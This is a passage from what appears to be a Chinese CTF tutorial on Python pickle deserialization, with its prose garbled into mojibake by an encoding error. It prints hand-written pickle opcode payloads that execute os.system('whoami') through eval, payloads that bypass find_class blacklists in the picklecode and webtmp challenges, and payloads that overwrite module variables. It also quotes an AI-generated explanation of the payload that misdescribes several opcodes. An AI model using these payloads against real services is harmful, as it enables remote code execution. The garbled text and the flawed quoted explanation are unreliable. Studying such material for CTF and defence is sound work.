ç¼–å†™opcodeæ—¶è¦æƒ³è±¡æ ˆä¸­çš„æ•°æ®ï¼Œä»¥æ­£ç¡®ä½¿ç”¨æ¯ç§opcodeã€‚ åœ¨ç†è§£æ—¶æ³¨æ„ä¸pythonæœ¬èº«çš„æ“ä½œå¯¹ç…§ï¼ˆæ¯”å¦‚pythonåˆ—è¡¨çš„appendå¯¹åº”aã€extendå¯¹åº”eï¼›å­—å…¸çš„updateå¯¹åº”uï¼‰ã€‚ cæ“ä½œç¬¦ä¼šå°è¯•importåº“ï¼Œæ‰€ä»¥åœ¨pickle.loadsæ—¶ä¸éœ€è¦æ¼æ´ä»£ç ä¸­å…ˆå¼•å…¥ç³»ç»Ÿåº“ã€‚ pickleä¸æ”¯æŒåˆ—è¡¨ç´¢å¼•ã€å­—å…¸ç´¢å¼•ã€ç‚¹å·å–å¯¹è±¡å±æ€§ä½œä¸ºå·¦å€¼ï¼Œéœ€è¦ç´¢å¼•æ—¶åªèƒ½å…ˆè·å–ç›¸åº”çš„å‡½æ•°ï¼ˆå¦‚getattrã€dict.getï¼‰æ‰èƒ½è¿›è¡Œã€‚ä½†æ˜¯å› ä¸ºå­˜åœ¨sã€uã€bæ“ä½œç¬¦ï¼Œä½œä¸ºå³å€¼æ˜¯å¯ä»¥çš„ã€‚å³â€œæŸ¥å€¼ä¸è¡Œï¼Œèµ‹å€¼å¯ä»¥â€ã€‚pickleèƒ½å¤Ÿç´¢å¼•æŸ¥å€¼çš„æ“ä½œåªæœ‰cã€iã€‚è€Œå¦‚ä½•æŸ¥å€¼ä¹Ÿæ˜¯CTFçš„ä¸€ä¸ªé‡è¦è€ƒç‚¹ã€‚ sã€uã€bæ“ä½œç¬¦å¯ä»¥æ„é€ å¹¶èµ‹å€¼åŸæ¥æ²¡æœ‰çš„å±æ€§ã€é”®å€¼å¯¹ã€‚ 5.4.2 æ‹¼æ¥opcode å°†ç¬¬ä¸€ä¸ªpickleæµç»“å°¾è¡¨ç¤ºç»“æŸçš„ . å»æ‰ï¼Œå°†ç¬¬äºŒä¸ªpickleæµä¸ç¬¬ä¸€ä¸ªæ‹¼æ¥èµ·æ¥å³å¯ã€‚ å…¨å±€å˜é‡è¦†ç›– pythonæºç ï¼š # secret.py name='TEST3213qkfsmfo' # main.py import pickle import secret opcode='''c__main__ secret (S'name' S'1' db.''' print('before:',secret.name) output=pickle.loads(opcode.encode()) print('output:',output) print('after:',secret.name) é¦–å…ˆï¼Œé€šè¿‡ c è·å–å…¨å±€å˜é‡ secret ï¼Œç„¶åå»ºç«‹ä¸€ä¸ªå­—å…¸ï¼Œå¹¶ä½¿ç”¨ b å¯¹secretè¿›è¡Œå±æ€§è®¾ç½®ï¼Œä½¿ç”¨åˆ°çš„payloadï¼š opcode='''c__main__ secret (S'name' S'1' db.''' è¾“å‡ºå¦‚ä¸‹ï¼š before: TEST3213qkfsmfo output: &lt;module 'secret' from 'D:\\\\Pythonproject\\\\Pickle_Study\\\\secret.py'&gt; after: 1 å‡½æ•°æ‰§è¡Œ ä¸å‡½æ•°æ‰§è¡Œç›¸å…³çš„opcodeæœ‰ä¸‰ä¸ªï¼š R ã€ i ã€ o ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»ä¸‰ä¸ªæ–¹å‘è¿›è¡Œæ„é€ ï¼š R ï¼š b'''cos system (S'whoami' tR.''' i ï¼š b'''(S'whoami' ios system .''' o ï¼š b'''(cos system S'whoami' o.''' å®ä¾‹åŒ–å¯¹è±¡ å®ä¾‹åŒ–å¯¹è±¡æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°æ‰§è¡Œï¼Œè¿™é‡Œç®€å•çš„ä½¿ç”¨ R æ„é€ ä¸€ä¸‹ï¼Œå…¶ä»–æ–¹å¼ç±»ä¼¼ï¼š import pickle class Student: def __init__(self, name, age): self.name = name self.age = age poc = b'''c__main__ Student (S'hybcx' S'19' tR.''' a = pickle.loads(poc) print(a.name, a.age) åˆ°è¿™é‡Œå·²ç»åŸºæœ¬ç†Ÿç»ƒå¯¹äºè¯¥æ‰‹å·¥æ„é€ payloadäº†ï¼Œä¹Ÿèƒ½å¯¹æ¯æ¡è¯­å¥çœ‹æ‡‚ï¼Œä¸è¿‡æœ‰ç‚¹ç–‘æƒ‘çš„å°±æ˜¯æœ€å‰é¢çš„bï¼Œå¯¹äºä¸Šè¿°è¡¨æ ¼çš„è§£é‡Šï¼Œæˆ‘è¿˜æ˜¯æœ‰ç‚¹æ‡µæ‡‚ï¼Œåªæ˜¯æ„Ÿè§‰båªæ˜¯ä¸€ä¸ªä½¿åç»­çš„å­—ç¬¦ä¸²æˆä¸ºä¸€ä¸ªå¯¹è±¡çš„ä½œç”¨å§ï¼Œå¯èƒ½ã€‚ pkerçš„ä½¿ç”¨ï¼ˆæ¨èï¼‰ pkeræ˜¯ç”±@eddieivan01ç¼–å†™çš„ä»¥ä»¿ç…§Pythonçš„å½¢å¼äº§ç”Ÿpickle opcodeçš„è§£æå™¨ï¼Œå¯ä»¥åœ¨https://github.com/eddieivan01/pkerä¸‹è½½æºç ã€‚è§£æå™¨çš„åŸç†è§ä½œè€…çš„paperï¼šé€šè¿‡ASTæ¥æ„é€ Pickle opcodeã€‚ ä½¿ç”¨pkerï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ–¹ä¾¿åœ°ç¼–å†™pickle opcodeï¼Œpkerçš„ä½¿ç”¨æ–¹æ³•å°†åœ¨ä¸‹æ–‡ä¸­è¯¦ç»†ä»‹ç»ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå»ºè®®åœ¨èƒ½å¤Ÿæ‰‹å†™opcodeçš„æƒ…å†µä¸‹ä½¿ç”¨pkerè¿›è¡Œè¾…åŠ©ç¼–å†™ï¼Œä¸è¦è¿‡åˆ†ä¾èµ–pkerã€‚ æ³¨æ„äº‹é¡¹ pickleåºåˆ—åŒ–çš„ç»“æœä¸æ“ä½œç³»ç»Ÿæœ‰å…³ï¼Œä½¿ç”¨windowsæ„å»ºçš„payloadå¯èƒ½ä¸èƒ½åœ¨linuxä¸Šè¿è¡Œã€‚æ¯”å¦‚ï¼š # linux(æ³¨æ„posix): b'cposix system p0 (Vwhoami p1 tp2 Rp3 .' # windows(æ³¨æ„nt): b'cnt system p0 (Vwhoami p1 tp2 Rp3 .' 5.4.3 CTFå®æˆ˜ åšé¢˜ä¹‹å‰ï¼šäº†è§£pickle.Unpickler.find_class() ç”±äºå®˜æ–¹é’ˆå¯¹pickleçš„å®‰å…¨é—®é¢˜çš„å»ºè®®æ˜¯ä¿®æ”¹find_class()ï¼Œå¼•å…¥ç™½åå•çš„æ–¹å¼æ¥è§£å†³ï¼Œå¾ˆå¤šCTFé¢˜éƒ½æ˜¯é’ˆå¯¹è¯¥å‡½æ•°è¿›è¡Œï¼Œæ‰€ä»¥ææ¸…æ¥šå¦‚ ä½•ç»•è¿‡è¯¥å‡½æ•°å¾ˆé‡è¦ã€‚ ä»€ä¹ˆæ—¶å€™ä¼šè°ƒç”¨find_class()ï¼š ä»opcodeè§’åº¦çœ‹ï¼Œå½“å‡ºç°cã€iã€b'\\x93'æ—¶ï¼Œä¼šè°ƒç”¨ï¼Œæ‰€ä»¥åªè¦åœ¨è¿™ä¸‰ä¸ªopcodeç›´æ¥å¼•å…¥æ¨¡å—æ—¶æ²¡æœ‰è¿åè§„åˆ™å³å¯ã€‚ ä»pythonä»£ç æ¥çœ‹ï¼Œfind_class()åªä¼šåœ¨è§£æopcodeæ—¶è°ƒç”¨ä¸€æ¬¡ï¼Œæ‰€ä»¥åªè¦ç»•è¿‡opcodeæ‰§è¡Œè¿‡ç¨‹ï¼Œfind_class()å°±ä¸ä¼šå†è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´find_class()åªéœ€è¦è°ƒç”¨è¿‡ä¸€æ¬¡ï¼Œé€šè¿‡ä¹‹åå†äº§ç”Ÿçš„å‡½æ•°åœ¨é»‘åå•ä¸­ä¹Ÿä¸ä¼šæ‹¦æˆªï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡__import__ç»•è¿‡ä¸€äº›é»‘åå•ã€‚ ä¸‹é¢å…ˆçœ‹ä¸¤ä¸ªä¾‹å­ï¼š safe_builtins = {'range','complex','set','frozenset','slice',} class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes from builtins. if module == \"builtins\" and name in safe_builtins: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" %(module, name)) class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == '__main__': # åªå…è®¸__main__æ¨¡å— return getattr(sys.modules['__main__'], name) raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) ç¬¬ä¸€ä¸ªä¾‹å­æ˜¯å®˜æ–¹æ–‡æ¡£ä¸­çš„ä¾‹å­ï¼Œä½¿ç”¨ç™½åå•é™åˆ¶äº†èƒ½å¤Ÿè°ƒç”¨çš„æ¨¡å—ä¸º{'range','complex','set','frozenset','slice',}ã€‚ ç¬¬äºŒä¸ªä¾‹å­æ˜¯é«˜æ ¡æˆ˜ç–«ç½‘ç»œå®‰å…¨åˆ†äº«èµ›Â·webtmpä¸­çš„è¿‡æ»¤æ–¹æ³•ï¼Œåªå…è®¸__main__æ¨¡å—ã€‚è™½ç„¶çœ‹èµ·æ¥å¾ˆå®‰å…¨ï¼Œä½†æ˜¯è¢«å¼•å…¥ä¸»ç¨‹åºçš„æ¨¡å—éƒ½å¯ä»¥é€šè¿‡__main__è°ƒç”¨ä¿®æ”¹ï¼Œæ‰€ä»¥é€ æˆäº†å˜é‡è¦†ç›–ã€‚ ç”±è¿™ä¸¤ä¸ªä¾‹å­æˆ‘ä»¬äº†è§£åˆ°ï¼Œå¯¹äºå¼€å‘è€…è€Œè¨€ï¼Œä½¿ç”¨ç™½åå•è°¨æ…åˆ—å‡ºå®‰å…¨çš„æ¨¡å—åˆ™æ˜¯è§„é¿å®‰å…¨é—®é¢˜çš„æ–¹æ³•ï¼›è€Œå¦‚ä½•ç»•è¿‡find_classå‡½æ•°å†… çš„é™åˆ¶å°±æ˜¯pickleååºåˆ—åŒ–è§£é¢˜çš„å…³é”®ã€‚ æ­¤å¤–ï¼ŒCTFä¸­çš„è€ƒå¯Ÿç‚¹å¾€å¾€è¿˜ä¼šç»“åˆpythonçš„åŸºç¡€çŸ¥è¯†ï¼ˆå¾€å¾€æ˜¯å†…ç½®çš„æ¨¡å—ã€å±æ€§ã€å‡½æ•°ï¼‰è¿›è¡Œï¼Œè€ƒå¯Ÿå¯¹ç™½åå•æ¨¡å—çš„ç†Ÿæ‚‰ç¨‹åº¦ï¼Œæ‰€ä»¥åš é¢˜çš„æ—¶å€™å¯ä»¥å…ˆæŠŠç™½åå•æ¨¡å—çš„æ–‡æ¡£çœ‹ä¸€çœ‹:) ç»•è¿‡builtins åœ¨ä¸€äº›ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å¸¸å¸¸ä¼šè§åˆ°module==\"builtins\"è¿™ä¸€é™åˆ¶ï¼Œæ¯”å¦‚å®˜æ–¹æ–‡æ¡£ä¸­çš„ä¾‹å­ï¼Œåªå…è®¸æˆ‘ä»¬å¯¼å…¥builtinsè¿™ä¸€æ¨¡å— if module == \"builtins\" and name in safe_builtins: return getattr(builtins, name) é‚£ä¹ˆä»€ä¹ˆæ˜¯builtinsæ¨¡å—å‘¢ï¼Ÿ å½“æˆ‘ä»¬å¯åŠ¨Pythonä¹‹åï¼Œå³ä½¿æ²¡æœ‰åˆ›å»ºä»»ä½•çš„å˜é‡æˆ–è€…å‡½æ•°ï¼Œè¿˜æ˜¯ä¼šæœ‰è®¸å¤šå‡½æ•°å¯ä»¥ä½¿ç”¨ï¼Œå¦‚ &gt;&gt;&gt;int(1) 1 ä¸Šè¿°è¿™ç±»å‡½æ•°è¢«æˆ‘ä»¬ç§°ä¸ºâ€å†…ç½®å‡½æ•°â€ï¼Œè¿™å…¶å®å°±æ˜¯builtinsæ¨¡å—çš„åŠŸåŠ³ï¼Œè¿™äº›å†…ç½®å‡½æ•°éƒ½æ˜¯åŒ…å«åœ¨builtinsæ¨¡å—å†…çš„ã€‚è€ŒPythonè§£é‡Šå™¨åœ¨å¯åŠ¨æ—¶å·²ç»è‡ªåŠ¨å¸®æˆ‘ä»¬å¯¼å…¥äº†builtinsæ¨¡å—ï¼Œæ‰€ä»¥æˆ‘ä»¬è‡ªç„¶å°±å¯ä»¥ä½¿ç”¨è¿™äº›å†…ç½®å‡½æ•°äº†ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡for i in sys.modules['builtins'].__dict__:print(i)æ¥æŸ¥çœ‹è¯¥æ¨¡å—ä¸­åŒ…å«çš„æ‰€æœ‰æ¨¡å—å‡½æ•°ç­‰ï¼Œå¤§è‡´å¦‚ä¸‹ Code-Breaking:picklecode import pickle import io import builtins class RestrictedUnpickler(pickle.Unpickler): blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'} def find_class(self, module, name): # Only allow safe classes from builtins. if module == \"builtins\" and name not in self.blacklist: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) def restricted_loads(s): \"\"\"Helper function analogous to pickle.loads().\"\"\" return RestrictedUnpickler(io.BytesIO(s)).load() é¢˜ç›®å°†pickleèƒ½å¤Ÿå¼•å…¥çš„æ¨¡å—é™å®šä¸ºbuiltinsï¼Œå¹¶ä¸”è®¾ç½®äº†å­æ¨¡å—é»‘åå•ï¼š{'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}ï¼Œäºæ˜¯æˆ‘ä»¬èƒ½å¤Ÿç›´æ¥åˆ©ç”¨çš„æ¨¡å—æœ‰ï¼š builtinsæ¨¡å—ä¸­ï¼Œé»‘åå•å¤–çš„å­æ¨¡å—ã€‚ å·²ç»importçš„æ¨¡å—ï¼šioã€builtinsï¼ˆéœ€è¦å…ˆåˆ©ç”¨builtinsæ¨¡å—ä¸­çš„å‡½æ•°ï¼‰ é»‘åå•ä¸­æ²¡æœ‰getattrï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡getattrè·å–ioæˆ–builtinsçš„å­æ¨¡å—ä»¥åŠå­æ¨¡å—çš„å­æ¨¡å—:)ï¼Œè€Œbuiltinsé‡Œæœ‰evalã€execç­‰å±é™©å‡½æ•°ï¼Œå³ä½¿åœ¨é»‘åå•ä¸­ï¼Œä¹Ÿå¯ä»¥é€šè¿‡getattrè·å¾—ã€‚pickleä¸èƒ½ç›´æ¥è·å–builtinsä¸€çº§æ¨¡å—ï¼Œä½†å¯ä»¥é€šè¿‡builtins.globals()è·å¾—builtinsï¼›è¿™æ ·å°±å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç äº†ã€‚ æˆ‘ä»¬å¯ä»¥å€Ÿé‰´Pythonæ²™ç®±é€ƒé€¸çš„æ€è·¯ï¼Œè·å–æˆ‘ä»¬æƒ³è¦çš„å‡½æ•°ã€‚ä»£ç æ²¡æœ‰ç¦ç”¨getattr()å‡½æ•°ï¼Œgetattrå¯ä»¥è·å–å¯¹è±¡çš„å±æ€§å€¼ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡builtins.getattr(builtins,'eval')çš„å½¢å¼æ¥è·å–evalå‡½æ•° æ¥ä¸‹æ¥æˆ‘ä»¬å¾—æ„é€ å‡ºä¸€ä¸ªbuiltinsæ¨¡å—æ¥ä¼ ç»™getattrçš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨builtins.globals()å‡½æ•°è·å–builtinsæ¨¡å—åŒ…å«çš„å†…å®¹ import builtins print(builtins.globals()) å¯è§builtinsæ¨¡å—ä¸­ä»åŒ…å«builtinsæ¨¡å—ã€‚ç”±äºè¿”å›çš„ç»“æœæ˜¯ä¸ªå­—å…¸ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦è·å–get()å‡½æ•° æœ€ç»ˆæ„é€ çš„payloadä¸ºbuiltins.getattr(builtins.getattr(builtins.dict,'get')(builtins.golbals(),'builtins'),'eval')(command) æ€è·¯æœ‰äº†ï¼Œä¸‹é¢å°±æ˜¯æ‰‹å†™opcodeäº†ã€‚é¦–å…ˆè·å–getå‡½æ•° import pickle import pickletools opcode=b'''cbuiltins getattr (cbuiltins dict S'get' tR. ''' pickletools.dis(opcode) print(pickle.loads(opcode)) ###ç»“æœå¦‚ä¸‹ 0: c GLOBAL 'builtins getattr' 18: ( MARK 19: c GLOBAL 'builtins dict' 34: S STRING 'get' 41: t TUPLE (MARK at 18) 42: R REDUCE 43: . STOP highest protocol among opcodes = 0 &lt;method 'get' of 'dict' objects&gt; ç„¶åè·å–globals()å­—å…¸ import pickle import pickletools opcode2=b'''cbuiltins globals )R. ''' pickletools.dis(opcode2) print(pickle.loads(opcode2)) ###ç»“æœå¦‚ä¸‹ 0: c GLOBAL 'builtins globals' 18: ) EMPTY_TUPLE 19: R REDUCE 20: . STOP highest protocol among opcodes = 1 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;_frozen_importlib_external.SourceFileLoader object at 0x000001EF06A308B0&gt;, '__spec__': None, '__annotations__': {}, '__builtins__': &lt;module 'builtins' (built-in)&gt;, '__file__': 'C:/Users/34946/Desktop/å®‰å…¨å­¦ä¹ /Pickle_Learning/Pickle_builtins1.py', '__cached__': None, 'pickle': &lt;module 'pickle' from 'C:\\\\Users\\\\34946\\\\AppData\\\\Local\\\\Programs\\\\Python\\\\Python38\\\\lib\\\\pickle.py'&gt;, 'pickletools': &lt;module 'pickletools' from 'C:\\\\Users\\\\34946\\\\AppData\\\\Local\\\\Programs\\\\Python\\\\Python38\\\\lib\\\\pickletools.py'&gt;, 'opcode1': b\"cbuiltins getattr (cbuiltins dict S'get' tR. \", 'opcode2': b'cbuiltins globals )R. '} ç°åœ¨æˆ‘ä»¬æœ‰äº†get()ï¼Œæœ‰äº†globals()å­—å…¸ï¼ŒæŠŠä»–ä»¬ç»„åˆèµ·æ¥æˆ‘ä»¬å°±èƒ½å¤Ÿè·å–builtinsæ¨¡å—äº† import pickle import pickletools opcode3=b'''cbuiltins getattr (cbuiltins dict S'get' tR(cbuiltins globals )RS'__builtins__' tR.''' #ä»¥ä¸Šopcodeç›¸å½“äºæ‰§è¡Œäº†builtins.getattr(builtins.dict,'get')(builtins.globals(),'builtins') pickletools.dis(opcode3) print(pickle.loads(opcode3)) ###ç»“æœå¦‚ä¸‹ 0: c GLOBAL 'builtins getattr' 18: ( MARK 19: c GLOBAL 'builtins dict' 34: S STRING 'get' 41: t TUPLE (MARK at 18) 42: R REDUCE 43: ( MARK 44: c GLOBAL 'builtins globals' 62: ( MARK 63: t TUPLE (MARK at 62) 64: R REDUCE 65: S STRING 'builtins' 77: t TUPLE (MARK at 43) 78: R REDUCE 79: . STOP highest protocol among opcodes = 0 &lt;module 'builtins' (built-in)&gt; æœ€åæˆ‘ä»¬å†è°ƒç”¨è·å–åˆ°çš„builtinsçš„evalå‡½æ•°å³å¯ import pickle opcode4=b'''cbuiltins getattr (cbuiltins getattr (cbuiltins dict S'get' tR(cbuiltins globals )RS'__builtins__' tRS'eval' tR.''' print(pickle.loads(opcode4)) ### &lt;built-in function eval&gt; æœ€ç»ˆpayloadä¸ºï¼š b'''cbuiltins getattr p0 (cbuiltins dict S'get' tRp1 cbuiltins globals )Rp2 00g1 (g2 S'builtins' tRp3 0g0 (g3 S'eval' tR(S'__import__(\"os\").system(\"whoami\")' tR. ''' è¿™é‡Œé™„ä¸ŠGPTçš„åˆ†æï¼Œä½†è§£é‡Šçš„ä¸å¤ªå¥½ã€‚ã€‚ã€‚ è®©æˆ‘ä»¬é€è¡Œè§£é‡Šä¸Šè¿° Pickle æ•°æ®å—ä¸­çš„ä»£ç ï¼Œå¹¶è¯´æ˜æ¯è¡Œä¹‹é—´çš„å…±åŒä½œç”¨ï¼š 1. `cbuiltins`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºä½¿ç”¨ `builtins` æ¨¡å—ã€‚ 2. `getattr`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºè°ƒç”¨ `builtins` æ¨¡å—çš„ `getattr` å‡½æ•°ã€‚ 3. `p0`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºå°†æ¥ä¸‹æ¥çš„å€¼å‹å…¥å †æ ˆé¡¶ï¼Œæ ‡è®°ä¸ºä½ç½® `0`ã€‚ 4. `(cbuiltins`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºåˆ›å»ºä¸€ä¸ªå…ƒç»„ï¼ŒåŒ…å«äº† `builtins` æ¨¡å—ã€‚ å…±åŒä½œç”¨ï¼š`cbuiltins` å’Œ `getattr` ä¸€èµ·è¡¨ç¤ºä½¿ç”¨ `builtins` æ¨¡å—çš„ `getattr` å‡½æ•°ã€‚ ç»“æœï¼šæ­¤æ—¶å †æ ˆé¡¶éƒ¨åŒ…å«äº†ä¸€ä¸ªè¡¨ç¤º `getattr` å‡½æ•°çš„å¯¹è±¡ã€‚ 5. `dict`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºåˆ›å»ºä¸€ä¸ªç©ºå­—å…¸ã€‚ 6. `S'get'`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºå°†å­—ç¬¦ä¸² `'get'` å‹å…¥å †æ ˆã€‚ 7. `tRp1`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºè°ƒç”¨ `dict` æ„é€ å‡½æ•°ï¼Œå°†é”®å€¼å¯¹åŠ å…¥å­—å…¸ã€‚è¿™é‡Œçš„é”®æ˜¯å­—ç¬¦ä¸² `'get'`ã€‚ å…±åŒä½œç”¨ï¼š`dict`ã€`S'get'` å’Œ `tRp1` ä¸€èµ·è¡¨ç¤ºåˆ›å»ºä¸€ä¸ªå­—å…¸ï¼Œå…¶ä¸­åŒ…å«äº†ä¸€ä¸ªé”®å€¼å¯¹ï¼ˆé”®ä¸º `'get'`ï¼‰ã€‚ ç»“æœï¼šæ­¤æ—¶å †æ ˆé¡¶éƒ¨åŒ…å«äº†ä¸€ä¸ªå­—å…¸ã€‚ 8. `cbuiltins`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºä½¿ç”¨ `builtins` æ¨¡å—ã€‚ 9. `globals`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºè°ƒç”¨ `builtins` æ¨¡å—çš„ `globals` å‡½æ•°ã€‚ 10. `)Rp2`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºè°ƒç”¨ `dict` æ„é€ å‡½æ•°ï¼Œå°†é”®å€¼å¯¹åŠ å…¥å­—å…¸ã€‚è¿™é‡Œçš„é”®æ˜¯å­—ç¬¦ä¸² `'globals'`ã€‚ å…±åŒä½œç”¨ï¼š`cbuiltins`ã€`globals` å’Œ `)Rp2` ä¸€èµ·è¡¨ç¤ºåˆ›å»ºä¸€ä¸ªå­—å…¸ï¼Œå…¶ä¸­åŒ…å«äº†ä¸¤ä¸ªé”®å€¼å¯¹ã€‚ ç»“æœï¼šæ­¤æ—¶å †æ ˆé¡¶éƒ¨åŒ…å«äº†ä¸€ä¸ªå­—å…¸ã€‚ 11. `00g1`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºå°†ä¸¤ä¸ªå­—å…¸å‹å…¥å †æ ˆã€‚ 12. `(g2`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºåˆ›å»ºä¸€ä¸ªå…ƒç»„ï¼ŒåŒ…å«äº†ä¸¤ä¸ªå­—å…¸ã€‚ 13. `S'builtins'`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºå°†å­—ç¬¦ä¸² `'builtins'` å‹å…¥å †æ ˆã€‚ 14. `tRp3`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºè°ƒç”¨ `__import__` å‡½æ•°ï¼Œå¹¶å°†å †æ ˆé¡¶éƒ¨çš„ä¸¤ä¸ªå€¼ä½œä¸ºå‚æ•°ä¼ é€’ç»™ `__import__`ã€‚ å…±åŒä½œç”¨ï¼š`(g2`ã€`S'builtins'` å’Œ `tRp3` ä¸€èµ·è¡¨ç¤ºä½¿ç”¨ `__import__` å‡½æ•°å¯¼å…¥ `builtins` æ¨¡å—ã€‚ ç»“æœï¼šæ­¤æ—¶å †æ ˆé¡¶éƒ¨åŒ…å«äº† `builtins` æ¨¡å—çš„å¯¹è±¡ã€‚ 15. `0g0`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºå°†ä¸¤ä¸ªå­—å…¸å‹å…¥å †æ ˆã€‚ 16. `(g3`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºåˆ›å»ºä¸€ä¸ªå…ƒç»„ï¼ŒåŒ…å«äº†ä¸¤ä¸ªå­—å…¸ã€‚ 17. `S'eval'`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºå°†å­—ç¬¦ä¸² `'eval'` å‹å…¥å †æ ˆã€‚ 18. `tR`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºè°ƒç”¨ `eval` å‡½æ•°ï¼Œå¹¶å°†å †æ ˆé¡¶éƒ¨çš„ä¸¤ä¸ªå€¼ä½œä¸ºå‚æ•°ä¼ é€’ç»™ `eval`ã€‚ 19. `(S'__import__(\"os\").system(\"whoami\")'`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºåˆ›å»ºä¸€ä¸ªå…ƒç»„ï¼ŒåŒ…å«äº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å«äº† `eval` æ‰§è¡Œçš„ä»£ç ã€‚è¿™æ®µä»£ç å°è¯•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ `whoami`ã€‚ 20. `tR.`: è¿™ä¸ªæ“ä½œç è¡¨ç¤ºè°ƒç”¨ `eval` å‡½æ•°ï¼Œå¹¶å°†å †æ ˆé¡¶éƒ¨çš„ä¸¤ä¸ªå€¼ä½œä¸ºå‚æ•°ä¼ é€’ç»™ `eval`ã€‚ æœ€ç»ˆç»“æœï¼šæ ¹æ® `eval` å‡½æ•°çš„è°ƒç”¨ï¼Œå®ƒä¼šæ‰§è¡Œå­—ç¬¦ä¸² `'__import__(\"os\").system(\"whoami\")'` ä¸­çš„ä»£ç ï¼Œå³æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ `whoami`ã€‚ç”±äºè¿™æ®µä»£ç æ˜¯æ¶æ„çš„ï¼Œå®ƒè¯•å›¾åœ¨ç³»ç»Ÿä¸Šæ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œè¿™å¯èƒ½ä¼šå¼•å‘å®‰å…¨é—®é¢˜ã€‚å› æ­¤ï¼Œå¤„ç†æ¥è‡ªä¸å—ä¿¡ä»»æºçš„ Pickle æ•°æ®æ—¶è¦éå¸¸å°å¿ƒï¼Œä»¥é˜²æ­¢æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚ è¿™é‡Œç”¨pkerå·¥å…·ä½¿ç”¨çš„è¯ï¼Œè¿‡ç¨‹å¦‚ä¸‹ï¼š #payload.py #è·å–getattrå‡½æ•° getattr = GLOBAL('builtins', 'getattr') #è·å–å­—å…¸çš„getæ–¹æ³• get = getattr(GLOBAL('builtins', 'dict'), 'get') #è·å–globalsæ–¹æ³• golbals=GLOBAL('builtins', 'globals') #è·å–å­—å…¸ builtins_dict=golbals() #è·å–builtinsæ¨¡å— __builtins__ = get(builtins_dict, '__builtins__') #è·å–evalå‡½æ•° eval=getattr(__builtins__,'eval') eval(\"__import__('os').system('whoami')\") return python3 pker.py &lt; pker_test.py b\"cbuiltins getattr p0 0g0 (cbuiltins dict S'get' tRp1 0cbuiltins globals p2 0g2 (tRp3 0g1 (g3 S'__builtins__' tRp4 0g0 (g4 S'eval' tRp5 0g5 (S'__import__(\\\\'os\\\\').system(\\\\'whoami\\\\')' tR.\" é«˜æ ¡æˆ˜ç–«ç½‘ç»œå®‰å…¨åˆ†äº«èµ›:webtmp é™åˆ¶ä¸­ï¼Œæ”¹å†™äº†find_classå‡½æ•°ï¼Œåªèƒ½ç”Ÿæˆ__main__æ¨¡å—çš„pickleï¼š class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == '__main__': # åªå…è®¸__main__æ¨¡å— return getattr(sys.modules['__main__'], name) raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) æ­¤å¤–ï¼Œç¦æ­¢äº†b'R'ï¼š try: pickle_data = request.form.get('data') if b'R' in base64.b64decode(pickle_data): return 'No... I don\\'t like R-things. No Rabits, Rats, Roosters or RCEs.' ç›®æ ‡æ˜¯è¦†ç›–secretä¸­çš„éªŒè¯ï¼Œç”±äºsecretè¢«ä¸»ç¨‹åºå¼•å…¥ï¼Œæ˜¯å­˜åœ¨äº__main__ä¸‹çš„secretæ¨¡å—ä¸­çš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¦†ç›–æ‰ï¼Œæ­¤æ—¶å°±æˆåŠŸç»•è¿‡äº†é™åˆ¶ï¼š b'''c__main__ secret (S'name' S\"1\" S\"category\" S\"2\" db0(S\"1\" S\"2\" i__main__ Animal .''' 